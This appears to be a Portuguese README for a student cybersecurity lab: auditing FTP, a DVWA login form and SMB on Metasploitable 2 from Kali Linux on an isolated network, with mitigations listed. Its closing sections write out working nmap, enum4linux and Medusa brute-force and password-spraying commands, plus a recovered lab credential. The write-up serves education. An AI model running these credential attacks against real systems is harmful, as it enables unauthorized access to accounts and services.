
# Auditoria de Segurança em Laboratório com Kali Linux e Metasploitable 2

## Sobre o projeto

Este projeto foi desenvolvido como atividade prática de estudos em cibersegurança, utilizando Kali Linux e Metasploitable 2 em um ambiente controlado e isolado.

O objetivo foi compreender técnicas de auditoria de autenticação, identificar riscos associados a serviços vulneráveis e documentar os procedimentos e medidas de mitigação.

## Objetivos

- Compreender técnicas de auditoria de autenticação FTP.
- Analisar vulnerabilidades em formulários web utilizando DVWA.
- Estudar riscos relacionados à exposição do serviço SMB.
- Utilizar ferramentas de reconhecimento e análise.
- Documentar evidências e propor medidas de mitigação.

## Ambiente utilizado

- VirtualBox
- Kali Linux (placa de rede modo
- Metasploitable 2
- Nmap
- Medusa
- DVWA

## Topologia do laboratório

As máquinas virtuais foram configuradas em uma rede isolada no VirtualBox, evitando exposição dos serviços vulneráveis a redes externas.

![Configuração do laboratório](images/01_virtualbox.png)

## 1. Reconhecimento

Foi realizado o reconhecimento do ambiente para identificar os serviços disponíveis no alvo.

![Reconhecimento](images/03_nmap.png)

## 2. Auditoria FTP

Foi estudado o serviço FTP e o risco relacionado a tentativas de autenticação utilizando credenciais fracas.

![Auditoria FTP](images/04_ftp.png)

### Mitigações

- Substituição do FTP por SFTP ou FTPS.
- Restrição de acesso por firewall.
- Políticas de senhas robustas.
- Monitoramento das tentativas de autenticação.

## 3. Auditoria Web - DVWA

Foi analisado o comportamento de um formulário web vulnerável em ambiente de laboratório.

![DVWA](images/05_dvwa.png)

### Mitigações

- Implementação de MFA.
- Limitação de tentativas de login.
- CAPTCHA adaptativo.
- Monitoramento de eventos de autenticação.

## 4. Auditoria SMB

Foi estudada a exposição de serviços SMB, enumeração e os riscos relacionados a autenticação inadequada.

![SMB](images/06_smb.png)

### Mitigações

- Restrição das portas 139 e 445.
- Desativação do SMBv1.
- Políticas de autenticação.
- Monitoramento de eventos.
- Princípio do menor privilégio.

## Conclusão

A atividade proporcionou uma experiência prática de reconhecimento e análise de serviços, além da compreensão dos riscos associados a mecanismos de autenticação inadequados.

O laboratório reforçou a importância de ambientes controlados para estudos de segurança, da documentação técnica e da aplicação de medidas preventivas.

## Segurança e escopo

Todos os testes foram destinados ao ambiente de laboratório isolado, com finalidade educacional.

Este projeto não tem como objetivo realizar testes contra sistemas, redes ou contas de terceiros.

---
Projeto desenvolvido para fins educacionais e portfólio técnico.



### Comandos usados no FTP

Pingando a máquina do metasploitable 2: ping -c 3 192.168.56.102 
Usando para identificar portas abertas com o nmap: nmap -sV -p 21,22,80,445,139 192.168.56.102
Conferindo se o FTP está aceitando conexões: ftp 192.168.56.102
Criando uma lista de possíveis usuários: echo -e "user\nmsfadmin\nadmin\root" > users.txt
Criando uma lista de possíveis senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
Usando o medusa verificar combinações de possíveis logins e senhas: medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
Se as combinações derem certo, testando conexão com o comando: ftp 192.168.56.102


### Ataque de força bruta em formulário de Login Web DVWA

Criando uma lista de possíveis usuários: echo -e "user\nadmin\nmsfadmin\nadmin\nroot" > users.txt
Criando uma lista de possíveis senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
Usando medusa para verificar combinações: medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
						-m PAGE: '/dvwa/login.php' \
						-m FORM: 'username-^USER^&password=^PASS^&Login=Login' \
						-m 'FAIL=Login failed' -t 6
Usuário e senha encontrado: 
msfadmin
Senha: password



### Ataque em cadeia Enumeração SMB e Password Spraying

Interagindo com o protocolo SMB, caso esteja mal configurado, para estrair informações: enum4linux -a 192.168.56.102 | tee enum4_output.txt

Abrindo o comando rodado: less enum4_output.txt
Criando a wordlist de usuários: echo -e "user\nmsfadmin\nservice" > smb_users.txt
Criando a wordlist de senhas: echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
Ataque com medusa: medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
smbclient -L //192.168.56.102 -U msfadmin
Após digitar o usuário e senha correto, ele vai exibir a lista de compartilhamento